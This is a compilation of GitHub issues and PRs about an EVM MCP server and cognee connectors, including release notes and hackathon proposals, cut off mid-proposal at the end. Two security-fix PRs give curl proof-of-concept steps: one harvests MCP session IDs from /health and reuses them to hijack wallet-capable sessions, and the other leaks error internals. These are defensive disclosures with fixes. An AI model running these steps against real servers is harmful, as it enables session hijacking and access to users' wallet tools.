title: Proposal: verifiable pre-broadcast policy hook for price-dependent contract writes
cleaned_text: Proposal: verifiable pre-broadcast policy hook for price-dependent contract writes Context This server gives AI agents a unified path to sign and broadcast state-changing operations across 60+ EVM networks through tools such as write_contract , transfer_native , transfer_erc20 , and approve_token_spending . For price-dependent contract writes, there is a useful missing control between “the agent produced valid calldata” and “the wallet signed it”: a provider-neutral policy hook that can verify fresh external evidence and return a machine-enforceable allow/warn/block decision before broadcast. This should not be described as a universal price check. A plain transfer, an approval, and arbitrary calldata often have no safely inferable asset pair or economic intent. Proposal Add optional beforeWrite and afterWrite middleware around the common signing/broadcast path. interface WritePolicy { beforeWrite(intent: CanonicalWriteIntent): Promise ; afterWrite?(result: { intentHash: 0x${string} ; txHash: 0x${string} ; evidence?: PolicyEvidence[]; }): Promise ; } interface CanonicalWriteIntent { chainId: number; from: 0x${string} ; to: 0x${string} ; value: string; data: 0x${string} ; functionSelector?: 0x${string} ; decodedFunction?: string; decodedArgs?: unknown[]; intentHash: 0x${string} ; } interface PolicyDecision { decision: 'allow' | 'warn' | 'block'; code: string; evidence?: PolicyEvidence[]; } Suggested configuration: writePolicy: { mode: 'off' | 'warn' | 'enforce'; // default: off targets: [ { chainId: 8453, contract: '0x...', selectors: ['0x...'], policy: 'price-safety' } ] } Enforcement semantics off : current behavior. warn : attach evidence/warnings to the tool result without blocking. enforce : a blocked, invalid, expired, or unavailable required check must fail before signing/broadcast. Enforcement applies only to configured targets/selectors with a trusted decoder. Direct transfers and approvals remain outside a price-safety policy unless a separate policy explicitly governs them. Unknown arbitrary calldata must be reported as not-evaluated , never “safe.” The canonical intent hash must be recomputed immediately before signing. Any mutation to chainId , to , value , or data after preflight invalidates the decision and blocks the write. Risk-reducing exits should remain available, but because generic calldata cannot prove an unwind, that classification should come from a trusted decoder/configuration rather than a caller-supplied flag. A caller-supplied safetyContext can be useful in warn mode, but should not be enough for enforce mode; otherwise an agent can omit or misstate the economic intent it wants checked. Concrete price-evidence adapter: Insight Insight is a cross-oracle safety layer for AI agents and trading bots. For supported asset pairs it provides: 10 oracle-provider integrations across 40+ networks. PASS / CAUTION / DANGER / BLOCK pre-trade verdicts. EIP-712 signed OracleSafetyCheck receipts with a default 600-second validity window. An opt-in v3 schema that signs its quorum and independence policy constants: at least 3 participating providers and at least 2 distinct non-derived operator groups. Local, zero-network verification through verify-insight-receipt ; verification needs no Insight API key. Execution receipts that can bind a pre-trade receipt UID to the resulting transaction hash. The Insight receipt should remain what it actually is: signed price-integrity evidence, not transaction permission. The EVM MCP layer would separately hash the canonical executable intent and retain both digests. After broadcast it can bind that intent and the Insight receipt UID to the actual tx hash. Smallest useful prototype I would be happy to contribute a focused PR for: Provider-neutral beforeWrite / afterWrite hooks, disabled by default. Canonical write-intent hashing immediately before signing. An allowlisted router/function decoder for one price-dependent swap path. An Insight adapter with a bounded timeout and local receipt verification. Structured policy metadata in successful and rejected MCP results. Tests proving that DANGER/BLOCK, invalid signature, expiry, timeout, and post-check calldata mutation cannot reach the broadcaster in enforce mode. Tests proving ordinary transfers, approvals, and out-of-scope contract writes keep their existing behavior. A test fixture showing a PASS execution and a deliberately stale/divergent check blocking the same route. Would a generic pre-broadcast policy hook fit the project’s direction? If so, I can start with the interface, intent hashing, and tests before adding a vendor adapter. _Disclosure: I am YuTao Peng, founder of Insight._

title: fix(http): stop exposing active MCP session IDs on /health
cleaned_text: fix(http): stop exposing active MCP session IDs on /health Summary The /health endpoint in src/server/http-server.ts returns the full list of active MCP session IDs to any unauthenticated caller. Because those same session IDs are the sole bearer credential used to reuse an existing MCP transport on POST /mcp , GET /mcp , and DELETE /mcp , disclosing them is equivalent to disclosing a session token — a network peer that can reach the health endpoint can hijack any live MCP session and invoke every registered tool (including wallet/transfer tools) as that session. File: src/server/http-server.ts (health handler around L154–L162 pre-fix) Class: CWE-200 — Exposure of Sensitive Information to an Unauthorized Actor Default exposure: the server binds HOST=0.0.0.0 and PORT=3001 by default, so on any host without an external firewall the endpoint is reachable from the local network. Data flow A client opens an MCP session via POST /mcp with an initialize request. The server generates a UUID session ID and stores the transport in transports: Map (L18, L75). Subsequent POST /mcp , GET /mcp , and DELETE /mcp requests look up the transport purely by the mcp-session-id header (L61–L66, L117–L122, L138–L143). There is no other authentication. GET /health returned sessionIds: Array.from(transports.keys()) — the exact strings needed to satisfy step 2. Session IDs are unguessable UUIDs, so /health is the differentiator: without this leak the transport lookup is effectively bearer-token protected; with it, any network-adjacent process can enumerate live sessions. Fix Drop the sessionIds field from the /health response. activeSessions: transports.size is retained because a count is useful for liveness/monitoring and does not disclose credentials. res.status(200).json({ status: "ok", server: server ? "initialized" : "initializing", activeSessions: transports.size, sessionIds: Array.from(transports.keys()) activeSessions: transports.size }); Minimal, one-file change; no behavioural impact on /mcp handlers or on monitoring that reads status / activeSessions . Proof of concept With the server running on its defaults ( bun start:http → http://0.0.0.0:3001 ): 1. Open a legitimate MCP session as any client curl -s -X POST http://127.0.0.1:3001/mcp \ -H 'Content-Type: application/json' \ -H 'Accept: application/json, text/event-stream' \ -d '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2024-11-05","capabilities":{},"clientInfo":{"name":"victim","version":"1.0"}}}' -i | grep -i mcp-session-id (victim gets some session UUID) 2. From any other host that can reach port 3001, harvest live session IDs curl -s http:// :3001/health Before fix: {"status":"ok","server":"initialized","activeSessions":1,"sessionIds":[" "]} After fix: {"status":"ok","server":"initialized","activeSessions":1} 3. Reuse the harvested UUID to drive the victim's transport and call tools curl -s -X POST http:// :3001/mcp \ -H 'Content-Type: application/json' \ -H 'Accept: application/json, text/event-stream' \ -H 'mcp-session-id: ' \ -d '{"jsonrpc":"2.0","id":2,"method":"tools/list"}' Post-fix, step 2 no longer yields the session UUID, so step 3 cannot succeed without out-of-band knowledge of the token. Testing bun run build succeeds; only the health handler is touched. Manually exercised GET /health before and after the change — response shape matches the diff above. GET /mcp , POST /mcp , DELETE /mcp handlers are untouched; existing session lookup ( transports.has(sessionId) / transports.get(sessionId) ) continues to work for legitimate clients that already hold their own session ID. grep -rn "transports.keys\|Array.from(transports" src confirms no other endpoint leaks the same data. Adversarial review Before submitting we tried to disprove this: *"Session IDs are UUIDs — leaking them doesn't matter."* It does: the /mcp handlers treat a valid mcp-session-id as sufficient to bind to an existing transport (L61–L66). There is no additional auth, origin check, or per-session secret. The UUID *is* the credential. *" /health is normally firewalled."* The default bind is 0.0.0.0 , no auth middleware is registered, and the README instructs users to run bun start:http directly. Any co-tenant or LAN peer reaches it. Even on a public deployment behind a reverse proxy, /health is commonly whitelisted for uptime checks — that same path then leaks credentials. *"The precondition (network reach to port 3001) already grants equivalent access."* It doesn't. Network reach alone doesn't give an attacker a valid session ID — those are unguessable UUIDs — so /mcp requests without one are rejected. The /health leak is precisely what turns network reach into session hijack. Fix is scoped to the one line that made the disclosure possible; monitoring consumers that only need liveness continue to work.

title: fix(http): stop leaking internal error details in /mcp 500 responses
cleaned_text: fix(http): stop leaking internal error details in /mcp 500 responses Summary The HTTP MCP server's three /mcp handlers (POST, GET, DELETE) currently embed the raw error object in the JSON response returned to the client on 500 responses: res.status(500).json({ error: Internal server error: ${error} }); Because ${error} stringifies whatever exception was thrown by the underlying transport, viem, or Node itself, the response can contain stack traces, internal file paths, dependency version fingerprints, RPC endpoint URLs, or partially formed request state. This is a classic CWE-209 (Generation of Error Message Containing Sensitive Information) exposure. The HTTP server binds 0.0.0.0:3001 by default (see startHttpServer in src/server/http-server.ts ), so any network-adjacent caller can trigger it with a malformed request. Fix Return a static "Internal server error" string to the client and keep the full error in console.error , where operators can still see it. Three-line change, no behavioural change for successful requests, no new dependencies. res.status(500).json({ error: "Internal server error" }); Full details continue to be logged server-side via the existing console.error(...) calls immediately above each response. Proof of concept With the server running ( bun run start:http — mounts routes defined in src/server/http-server.ts ): Malformed JSON body → transport throws → error object interpolated into response curl -sS -X POST http://127.0.0.1:3001/mcp \ -H 'Content-Type: application/json' \ -H 'accept: application/json, text/event-stream' \ --data-binary '{"jsonrpc":"2.0"' Before the patch the response body contains a rendered error (e.g. {"error":"Internal server error: SyntaxError: Unexpected end of JSON input\n at ..."} ), leaking parser internals and file paths from the bundled node_modules . After the patch the body is {"error":"Internal server error"} and the stack remains only in the server log. The DELETE /mcp and GET /mcp (SSE) paths have the same pattern and are fixed identically; sending either without a valid mcp-session-id header reaches the same catch block. Security analysis CWE: 209 — Generation of Error Message Containing Sensitive Information Severity: Low (CVSS ~5.3 AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N). Information disclosure only; no code execution or state change. Preconditions: Network reachability to the HTTP MCP port (default 0.0.0.0:3001 ) and the ability to send a request that causes the handler to throw. No authentication is required at the transport layer. Mitigation provided: Removes the untrusted-length, unstructured error string from the response surface while preserving diagnosability via server logs. Adversarial review Before submitting we tried to talk ourselves out of this one. The obvious counter-argument is "the error strings are usually harmless" — but ${error} on a Node Error renders the full stack including absolute filesystem paths from the running host, and viem/StreamableHTTP errors include RPC URLs and request fragments. There is no framework-level filter in front of these responses (the handler writes directly with res.status(500).json(...) ), and Express does not sanitize user-supplied error content. The fix is a strict subtraction — no user-visible behaviour changes for successful requests, and operators keep full detail in logs — so we don't see a downside to landing it independently of the larger auth/session work. Testing bun install and bun run build succeed on the branch. tsc is clean; the change is a pure string replacement with no type impact. Manually reproduced the leak against bun run start:http on main and confirmed the patched build returns the static message while the server log still shows the full stack.

title: RPC reliability companion: OpenChainBench MCP
cleaned_text: RPC reliability companion: OpenChainBench MCP Love what you've built here — evm-mcp-server is the right foundation for AI agents working with on-chain systems. One gap I keep running into: the server uses hardcoded public endpoints (LlamaRPC, dRPC, PublicNode, chain-official RPCs) but there's no way for the agent to know which of those endpoints are actually healthy or fast at a given moment. A slow or stale RPC silently degrades the agent's results. OpenChainBench continuously benchmarks those exact providers across 40+ chains and exposes the data through a keyless MCP server: MCP endpoint : https://openchainbench.com/api/mcp/mcp (Streamable HTTP, no auth required) Tools : list_benchmarks , get_benchmark (current rankings, p50/p99 latency, success rate), query_prom (raw Prometheus) Repo : https://github.com/ChainBench/OpenChainBench The agent workflow with OCB: Agent calls OCB MCP to get current RPC latency rankings for the target chain Agent picks the fastest/most reliable endpoint from the live data Agent executes the EVM call via evm-mcp-server using that endpoint Not asking for a code change — flagging it as a companion tool for users who want RPC visibility, the same way the security scanning tool was flagged in #37. Happy to add evm-mcp-server as a usage example in the OCB docs if useful.

title: v1.6.5.dev0 — Distillation, Embeddings & Connector Hardening
cleaned_text: v1.6.5.dev0 — Distillation, Embeddings & Connector Hardening Release Date: 2026-10-16 Changes: v1.6.4.dev0 → v1.6.5.dev0 Pull Requests: #5287, #5534, #5620, #5622, #5720, #5721, #5722, #5725, #5726, #5751, #5798, #5898 Summary This release focuses on making memory distillation more reliable, improving how embeddings are produced and metered, and hardening connectors and LLM integrations. It includes several bug fixes, security and operational improvements, and a few breaking changes related to legacy embedding surfaces and local cache layout. Highlights More reliable distillation: distillation now reads only the QA turns it needs, seals entries per curator batch, and curates every new entry by default so distilled memories are accurate and consistent. Embeddings improvements: support requesting base64-encoded embeddings where supported, meter embedding token usage, lower the default embedding batch size for stability, and keep local model cache under a predictable path. Connector and LLM fixes: Gmail and Google Calendar connectors were hardened (better quota handling and permissions), litellm and Mistral model handling were improved, and Azure token handling is shared to reduce auth complexity. Security & alerts: daily CVE alert delivery to Slack was added and repository security docs updated to help teams stay informed. Breaking Changes Triplet embedding / triplet memify surfaces removed or deprecated — the older triplet embedding surfaces have been deprecated and parts removed. If you rely on 'triplet' embedding flows, migrate to the newer embedding surfaces and memify pipelines. Check your pipelines and replacements before upgrading. datamodel-code-generator minimum version raised — custom graph model generation requires datamodel-code-generator >= 0.56.0. Upgrade this dependency if you use custom graph models. Fastembed cache path change — FASTEMBED_CACHE_PATH was removed from the .env.template and fastembed now uses ~/.cognee/models by default. If you relied on a custom FASTEMBED_CACHE_PATH, update your environment or move your cache to the new location. New Features Request Base64 embeddings where supported — Some embedding providers can return vectors encoded as base64. Cognee now requests base64 embeddings when the provider supports them. Why it matters: base64 can improve compatibility with certain providers and transports, reducing encoding errors and simplifying integrations. Daily CVE alert to Slack — A new automated alert posts daily security advisories (CVE summaries) to a configured Slack channel. Why it matters: keeps your team aware of new vulnerabilities affecting dependencies so you can act faster. Clone a chosen branch of a repo during ingestion — You can now select which branch to clone when pulling a repository. Why it matters: makes ingestion reproducible and lets you index branch-specific code or docs without manual repo handling. Embedding token usage metering — The system now records the number of embedding tokens used per activity. Why it matters: helps understand and audit embedding usage for cost tracking and debugging. Improvements More focused distillation: distillation now reads only the required QA turns (instead of whole conversations), and curator runs seal distilled entries per batch so partial results don’t leak. This reduces work and makes distilled summaries more deterministic. Curate every new entry per distill run by default — every newly added memory entry is considered for distillation unless you change the setting, making sure new content is summarized promptly. Bind typed entries to the session's dataset — when the system writes typed (structured) memory entries during a session, they are now correctly associated with that session's dataset. Why it matters: preserves correct dataset ownership and prevents data from landing in the wrong dataset. Take dataset_id on remember_skill_run_entry — explicit dataset routing for remembered skill outputs improves traceability and correctness. Fastembed and local model cache changes — fastembed models are now kept under ~/.cognee/models by default for consistent caching across platforms; the ENV template no longer exposes a deprecated FASTEMBED_CACHE_PATH. Why it matters: fewer surprises when loading local models and better cross-machine behavior. Lower default embedding batch size (36 → 32) — reduces memory spikes and improves stability on constrained machines. Return plain vectors from embed_text — embedding functions now return raw numeric vectors rather than wrapped objects in more places, simplifying downstream use. Performance More stable embedding usage: lowering the default embedding batch size and keeping models in a consistent local cache reduces memory and latency spikes when creating embeddings. Reduced unnecessary distillation work: reading only necessary QA turns and sealing per batch reduces I/O and CPU used during distillation runs. Shared counters and pacing: connectors and background pollers share counts and pacing logic where appropriate to avoid accidental overload and smoothing throughput. Security Daily CVE alert to Slack — daily summaries of dependency vulnerabilities are now available via a new GitHub Actions + Slack flow to help teams respond faster. Hide NATURAL_LANGUAGE surface and remediation guidance — certain surfaces were made less visible and remediation notes were added to help secure deployments. Azure token provider sharing — Azure token usage is centralized for fewer spurious credential refreshes and simpler secure handling. Google Calendar and Gmail hardening — the calendar connector now has stricter checks; Gmail is more resilient to per-user quota rejections and shares pacing across mailbox processing to avoid accidental rate-limit spikes. Bug Fixes Read only the needed QA turns for distillation so the distillation step no longer loads unnecessary conversation turns. Drain the agent trace backlog per improve run so new improve runs don't see stale traces. Seal distilled entries per curator batch to avoid partial distillations being visible. Curate every new entry per distill run by default to ensure fresh content gets summarized. Pin Data selection reads under the lock to avoid races with concurrent deletes/forgets. Fix visualize permission checks so the permission-skip option is applied only when explicitly requested, and skip the permission check only for the dataset owner when appropriate. Survive Gmail per-user quota rejections and share pacing per mailbox to reduce operation failures. Return 403 with a clear message when Cypher (graph DB query interface) is disabled, instead of a generic error. Narrow litellm response types and correctly return Mistral’s parsed model representation to improve LLM reliability and type safety. Technical Changes Large refactor of retrieval and code search components — new modules for broad retriever, code retriever and hybrid retrieval were added or reorganized to improve search quality and maintainability. Memify pipelines reorganized — memify and related task registration were refactored; some old task modules (triplet embedding) were removed as part of the SDK cleanup. New evaluation framework assets — a Locomo-based evaluation adapter, metrics, and many reference run artifacts were added for internal evaluation and end-to-end QA. Improvements to LLM adapters and token/encoding utilities — better litellm adapters, Azure identity handling, and embedding encoding utilities to improve compatibility across LLM/back-end providers. Session and data selection robustness — session management and data selection logic were tightened (locking and selection checks) to avoid races with forget/delete workflows. Dependency Updates Updated: datamodel-code-generator: >=0.54.0 → >=0.56.0 enola-cli: ==0.4.26 → ==0.4.30 litellm: >=1.83.7, =1.102.2,<2.0.0 Removed: python-magic-bin <0.5 Compatibility Component | Supported / Required Python | >=3.10,<3.15 pydantic | >=2.10.5 litellm | >=1.102.2,<2.0.0 fastapi | >=0.116.2,<1.0.0 sqlalchemy | >=2.0.39,<3.0.0 lancedb | >=0.39.0,<0.40.0 ladybug | ==0.19.0 *— The Cognee Team · 2026-10-16*

title: Hackathon [Feature]: Add ServiceNow data-source connector
cleaned_text: Hackathon [Feature]: Add ServiceNow data-source connector Problem Statement ServiceNow is where many large companies keep their IT knowledge: knowledge-base articles, incidents, problems and change records. cognee has no ServiceNow connector and there is no issue for one. I searched issues and PRs in cognee, cognee-community and cognee-integrations for "servicenow" and found nothing. That history is what support and on-call engineers keep asking about ("what fixed this last time?"), and today it is only reachable through ServiceNow's own search. Proposed Solution Add a servicenow connector under packages/connector/servicenow/ in cognee-community, following the shape of the existing connectors. Auth: instance URL plus basic auth for a read-only integration user. No OAuth app needed. Ingest: published kb_knowledge articles (HTML rendered to text), plus incident , problem and change_request records (number, short description, description, resolution/close notes), read through the Table API. Tables are selectable; journal fields (work notes, comments) are opt-in. Incremental sync: sysparm_query=sys_updated_on>= ^ORDERBYsys_updated_on with sysparm_limit / sysparm_offset paging, and sysparm_display_value=true so references come back as names. The cursor lives in dlt resource state; rows are merge on sys_id . Forget-on-delete: deletions on audited tables are recorded in sys_audit_delete . Read it from the cursor and emit _deleted tombstones, falling back to an id sweep (like confluence ) when the integration user can't read it. KB articles that move out of published are tombstoned too. Watch out for REST rate limits are per instance and configurable. Honor 429 and back off. Journal fields live in sys_journal_field and often contain customer PII. Keep them off by default. Personal Developer Instances hibernate when idle and are reclaimed after a period of inactivity. Document this for anyone running the example. Use display values for references, or the graph fills up with raw sys_ids. Package layout to follow packages/connector/servicenow/ ├── README.md ├── cognee_community_connector_servicenow/ │ ├── init .py │ └── servicenow.py ├── examples/ ├── tests/ └── pyproject.toml Use Case An on-call engineer asks "has this VPN error happened before, and what fixed it?" or "is there a KB article for resetting SSO?" and gets an answer that links incidents, problems and knowledge articles together, from the ServiceNow data the company already has. Acceptance Criteria [ ] A user connects with an instance URL and credentials and selects which tables to ingest [ ] Selected content is ingested and searchable in cognee [ ] Incremental sync picks up only what changed since the last run [ ] Deleting a record upstream removes it from the graph on the next sync [ ] README with setup steps and a runnable example under examples/ [ ] Tests covering the ingest path and the incremental cursor Additional Context Testable for free: a ServiceNow Personal Developer Instance (developer.servicenow.com) comes with demo data, including incidents and knowledge articles. Difficulty: Intermediate (M). Basic auth, standard REST; the care is in deletes and PII. Opened for Mergetober (Path B). I'd like to build it. title: Hackathon [Feature]: Add npm Package Registry data-source connector (Mergetober proposal)
cleaned_text: Hackathon [Feature]: Add npm Package Registry data-source connector (Mergetober proposal) Problem Statement cognee recently added exact-release metadata for PyPI (#410), but has no data-source connector for npm, the largest software registry (>2.5M packages). AI coding assistants frequently need factual, grounded context about third-party JavaScript/TypeScript packages—such as verified README documentation, breaking changes between versions, peer dependencies, and repository links—without hallucinating APIs. The npm registry exposes a fast, public, read-only REST API ( https://registry.npmjs.org/ ) that requires zero API keys or authentication. Proposed Solution Add packages/connector/npm/ in cognee-community : Input : A list of package names ( package_names=["zod", "express"] ) or a path to a project's package.json to automatically resolve dependencies. Fetch : Query https://registry.npmjs.org/ (or specific version tags). Ingestion : Ingest package README markdown, latest version metadata, maintainers, license, repository URL, keywords, and dependency manifests as documents. Pipeline Integration : Declare DOCUMENT_SOURCE_ATTR = "npm" for standard document-mode cognify processing. Sync : Full snapshot sync using write_disposition="replace" . Watch out for Payload size : Ingest the latest version manifest and README rather than the entire historical version array to keep memory and token usage lightweight. Network retries : Standard backoff for transient HTTP 429/5xx responses using httpx . Alternatives Considered Generic web scraping of npmjs.com is brittle and throttled. The registry API provides clean, structured JSON and raw markdown. Use Case A developer or coding agent asks: *"What are the peer dependency requirements for package X?"* or *"How do I configure middleware Y according to its README?"* and cognee answers using grounded registry documentation. Implementation Ideas Model after packages/connector/notion with async httpx calls, zero required secrets, and pytest fixtures covering standard and scoped package names (e.g. @types/node ).

title: Hackathon [Feature]: Add ChatGPT data-source connector
cleaned_text: Hackathon [Feature]: Add ChatGPT data-source connector Problem Statement A lot of people have months or years of ChatGPT conversations with decisions, research and half-finished ideas in them. For a memory platform, that history feels like one of the most natural things to import, but there's currently no way to get it into cognee. Proposed Solution A chatgpt connector under packages/connector/chatgpt/ in cognee-community, built the same way as the existing connectors. Auth: none. It reads the official data export (Settings → Data controls → Export data). Ingest: conversations.json from the export zip: conversation titles, user and assistant messages, the model used, and timestamps. Incremental sync: based on each conversation's update_time , so a newer export only re-ingests the conversations that changed. Forget-on-delete: if a conversation is missing from a newer export (because it was deleted in ChatGPT), it should be removed from the graph on the next sync. Acceptance criteria [ ] You can point the connector at a ChatGPT export (zip or unzipped folder) [ ] Each conversation is ingested along the branch the user kept, with title, roles and timestamps, and shows up in cognee search [ ] Edited or regenerated answers don't create duplicate or conflicting messages [ ] Incremental sync only re-ingests conversations whose update_time changed [ ] Conversations deleted in ChatGPT are removed from the graph on the next sync [ ] README with export steps and a runnable example in examples/ [ ] Tests for the tree walk, the ingest path and the incremental cursor Alternatives Considered An API: OpenAI doesn't offer one for ChatGPT chat history, so the export is the only official way in. Scraping the ChatGPT website: fragile and against the terms. Not worth it when the export exists. Dumping conversations.json into cognee.add() as-is: it works badly, because the raw file is a tree full of abandoned branches and hidden messages, so the graph ends up with duplicates and answers the user threw away. Use Case I've used ChatGPT for a long time to think through projects, compare options and draft things. When I start something new I often want to know "what did I already decide about this?" or "what was that library I asked about last year?" Getting that history into cognee would let me (or an agent working for me) recall it alongside my notes and docs instead of scrolling through ChatGPT's sidebar. Implementation Ideas Read the export with dlt's filesystem source. Set DOCUMENT_SOURCE_ATTR since the content is prose, use the conversation id as the primary key, and pick the write_disposition so deleted conversations get cleaned up by orphan_cleanup . Conversations aren't stored as a simple list. They're a tree (a mapping of nodes with parent and children ) because of edits and regenerated answers. To get what the user actually ended up with, start at current_node and walk back to the root. System and hidden tool messages can be skipped. This is very personal data. The README should say clearly what gets stored. Nice to have: Claude.ai has a similar export (Settings → Privacy → Export data) with a simpler, flat chat_messages format. The same package could support it. packages/connector/notion/ is the closest working example to copy the layout from: packages/connector/chatgpt/ ├── README.md ├── cognee_community_connector_chatgpt/ │ ├── init .py │ └── chatgpt.py ├── examples/ ├── tests/ └── pyproject.toml Additional Context Additional Context Proposed as part of the cognee hackathon connector push. Difficulty: Beginner friendly (E). No auth at all, just a file to parse. title: Hackathon [Feature]: Add FHIR (healthcare records) data-source connector
cleaned_text: Hackathon [Feature]: Add FHIR (healthcare records) data-source connector Problem Statement FHIR is the standard API for healthcare data. Epic, Oracle Health (Cerner), athenahealth and most modern EHRs expose it, and in the US it's required by regulation. One FHIR connector would let cognee read patient records from any of those systems, but there's nothing for healthcare on the connector list today. Healthcare records are also a very natural fit for a knowledge graph: patients, conditions, medications, encounters, practitioners and organizations all point at each other through explicit references. Proposed Solution A fhir connector under packages/connector/fhir/ in cognee-community, built the same way as the existing connectors. Auth: none for open test servers; SMART on FHIR backend-services OAuth (client credentials with a signed JWT) for real EHRs Ingest: a configurable set of FHIR R4 resources, for example Patient , Encounter , Condition , Observation , MedicationRequest , Procedure , AllergyIntolerance , Practitioner , Organization , and clinical notes from DocumentReference Incremental sync: FHIR's standard _lastUpdated=gt search parameter Forget-on-delete: resources deleted on the server (visible as DELETE entries in the _history endpoint) should be removed from the graph on the next sync Acceptance criteria [ ] You can connect to a FHIR R4 server (open, or with SMART backend-services auth) and choose which resource types to ingest [ ] Resources are ingested and searchable in cognee, and FHIR references ( subject , encounter , performer , ...) become graph edges [ ] Clinical notes from DocumentReference attachments are ingested as text [ ] Incremental sync only picks up resources updated since the last run, using _lastUpdated [ ] Resources deleted on the server are removed from the graph on the next sync [ ] README with setup steps, a clear note on PHI, and a runnable example in examples/ against a public test server [ ] Tests using synthetic data only (for example Synthea), covering the ingest path, reference edges and the incremental cursor Alternatives Considered One connector per EHR vendor: Epic, Cerner and the rest all speak FHIR, so per-vendor connectors would mostly duplicate each other. Ingesting C-CDA documents or PDF exports: loses the structure. You'd get text, but not which condition belongs to which encounter or which practitioner ordered what. Bulk FHIR export ( $export ): great for huge datasets but not supported everywhere and needs more setup. A good follow-up once the basic REST sync works. Use Case A care team or a clinical research group wants to ask "which patients with type 2 diabetes were prescribed metformin and had an HbA1c above 8 at their last visit?" or "what has happened with this patient since their last cardiology appointment?" Today that means clicking through an EHR record by record. With FHIR data in cognee, the graph already links the patient, their conditions, medications, lab results and visits, and the clinical notes can be searched next to the structured data. Implementation Ideas There's no dlt verified source for FHIR, so dlt's REST API source is the way to go. FHIR search returns a Bundle with a link whose relation is next , which maps cleanly onto the source's paginator. Clinical notes go down the document path ( DOCUMENT_SOURCE_ATTR ); the other resources as structured rows. FHIR references ( "reference": "Patient/123" ) are explicit, so most edges can be built deterministically without LLM extraction. Codes (SNOMED CT, LOINC, RxNorm) come with a human-readable display . Keep both, so a search for "metformin" still finds a MedicationRequest coded only as RxNorm. This is protected health information. The README must say clearly what gets stored, the connector should never log resource contents, and tests and examples must use synthetic data only. Free places to build and test against: the public HAPI FHIR server ( https://hapi.fhir.org/baseR4 ), a local HAPI server in Docker loaded with Synthea patients, and Epic's free developer sandbox ( fhir.epic.com ) for the SMART auth flow. packages/connector/notion/ is the closest working example to copy the layout from: packages/connector/fhir/ ├── README.md ├── cognee_community_connector_fhir/ │ ├── init .py │ └── fhir.py ├── examples/ ├── tests/ └── pyproject.toml Additional Context Proposed as part of the cognee hackathon connector push. Difficulty: Intermediate (M). The API is a well-documented standard, but mapping resources and references to the graph, plus SMART auth, needs real design work. title: Hackathon [Feature]: Add Tencent ima knowledge-base data-source connector
cleaned_text: Hackathon [Feature]: Add Tencent ima knowledge-base data-source connector Problem Statement Tencent ima is a widely used Chinese AI knowledge-base app: users collect notes and documents into personal knowledge bases. There is no ima connector in cognee or cognee-community and no open issue for it. A connector lets users bring their ima notes into cognee memory alongside other sources. Proposed Solution Add packages/connector/tencent-ima/ in cognee-community, using ima's official OpenAPI (Client ID + API Key from https://ima.qq.com/agent-interface). No cookies or private client APIs. Select: one or more knowledge bases chosen by the user. Ingest: list entries with the cursor API ( get_knowledge_list ), resolve notes via get_media_info , read the full text with get_doc_content . One document per note, with title, source id and ima link. Scope of v1: notes owned by the authenticated user. ima's docs restrict note-body access to the owner, so shared/subscribed content, PDFs and web clips are out of scope for now. Incremental sync: ima has no change feed for knowledge bases, so each run re-lists entries and only re-ingests notes whose content hash changed. Forget-on-delete: merge + _deleted tombstones (the Gmail / Confluence pattern), applied only after a fully successful scan . A failed page, permission error or unreadable body never counts as a deletion. Watch out for A few things I noticed in ima's API docs: Titles aren't unique, and the same item can sit in more than one knowledge base, so I'd key documents on knowledge base id + media id. A "successful" get_media_info response ( code=0 ) can come back with no content URL at all. Seeing an item in the list doesn't mean we can read it. Errors, including rate limiting, come back as business codes in the JSON body rather than HTTP status codes, so the connector has to check every response and back off on its own. Acceptance Criteria [ ] User connects with Client ID + API Key and picks knowledge bases [ ] Owned notes are ingested as readable documents and are searchable in cognee [ ] Re-runs skip unchanged notes; edited notes are updated [ ] Notes removed from the knowledge base are forgotten on the next complete sync; incomplete scans delete nothing [ ] README + runnable example under examples/ [ ] Tests for pagination, error codes, change detection and deletion safety Hi @NMZivkovic, I'd like to build this for Mergetober. Could you assign it to me if it fits? I'll wait for assignment before writing code.

title: Hackathon [Feature]: Add Product Hunt Daily Launches data-source connector (Mergetober proposal)
cleaned_text: Hackathon [Feature]: Add Product Hunt Daily Launches data-source connector (Mergetober proposal) Problem Statement cognee has connectors for team collaboration tools (Slack, Notion, Drive) and developer tools (GitHub, Postman), but lacks an integration for external product intelligence. Product managers, founders, and research agents need persistent memory of newly launched software, competitor offerings, maker profiles, and community feedback. Product Hunt is the primary platform for tech releases, and its official GraphQL API v2 provides structured daily launch data. Proposed Solution Add packages/connector/producthunt/ in cognee-community : Input : Date range ( days_back=7 ), category/topic filters (e.g., ["ai", "developer-tools"] ), or featured daily top products. Source : Product Hunt GraphQL API v2 ( PRODUCTHUNT_API_TOKEN ). Ingestion : Yield each product as a document: Product Name, Tagline, Description, Topics/Categories, Maker Names, Product URL, Upvotes count, and top community reviews. Pipeline Integration : Mark with DOCUMENT_SOURCE_ATTR = "producthunt" so products, companies, and makers are extracted into cognee's knowledge graph. Sync : Full snapshot with write_disposition="replace" into a dedicated dataset_name="producthunt" . Watch out for Rate limiting : Product Hunt v2 enforces hourly query quotas; paginate with conservative limits (e.g., 20 products per page). Opt-in scoping : Explicit dataset partitioning so users can refresh or prune launch memory with cognee.prune . Alternatives Considered HTML scraping is fragile and violates Product Hunt terms. The official GraphQL API provides clean pagination and rich maker metadata. Use Case A market research agent asks: *"What developer tools launched on Product Hunt this week?"* or *"What did early users say about product X during its launch?"* and cognee retrieves the exact launch details and feedback. Implementation Ideas Model after packages/connector/notion with GraphQL query execution, error handling, and mocked responses for DB-free CI testing.

title: Hackathon [Feature]: Add Kong Insomnia API collections data-source connector (Mergetober proposal)
cleaned_text: Hackathon [Feature]: Add Kong Insomnia API collections data-source connector (Mergetober proposal) Problem Statement cognee has Postman (#4711) in progress and Bruno (#5922) recently proposed, but lacks an integration for Kong Insomnia. Insomnia is widely used across backend and API teams for private internal microservices where public docs (like Swagger/OpenAPI pages) do not exist. Insomnia stores workspaces and collections as standard v4/v5 JSON/YAML files ( insomnia.json or directory export). Ingesting these collections gives AI agents structured memory of private endpoints, query parameters, auth headers, and payload schemas directly from existing team workspace exports without needing extra accounts or third-party API tokens. Proposed Solution Add packages/connector/insomnia/ in cognee-community : Input : Local path to an exported Insomnia workspace/collection file ( .json or .yaml ) or directory. Parsing : Walk the Insomnia collection graph: folders/request groups, HTTP/GraphQL requests, and environment variables. Ingestion : Convert each endpoint into a markdown document containing: request name, HTTP method, endpoint path/URL, query parameters, header keys, auth scheme (secrets stripped), body schema/example, and markdown docs. Pipeline Integration : Expose a dlt resource marked with DOCUMENT_SOURCE_ATTR = "insomnia" so each 